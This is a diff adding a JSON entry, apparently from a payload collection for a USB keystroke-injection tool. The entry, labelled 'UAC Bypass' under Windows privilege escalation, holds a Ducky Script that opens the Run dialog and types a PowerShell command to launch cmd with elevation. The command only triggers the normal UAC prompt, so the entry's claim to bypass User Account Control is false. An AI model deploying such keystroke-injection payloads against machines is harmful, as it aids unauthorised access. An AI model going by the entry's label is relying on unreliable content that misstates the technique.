@@ -1,0 +1,7 @@
+{
+  "name": "UAC Bypass",
+  "category": "Privilege Escalation",
+  "os": "Windows",
+  "description": "Bypass User Account Control",
+  "script": "REM UAC Bypass\nGUI r\nDELAY 500\nSTRING powershell Start-Process cmd -Verb runAs\nENTER\n"
+}
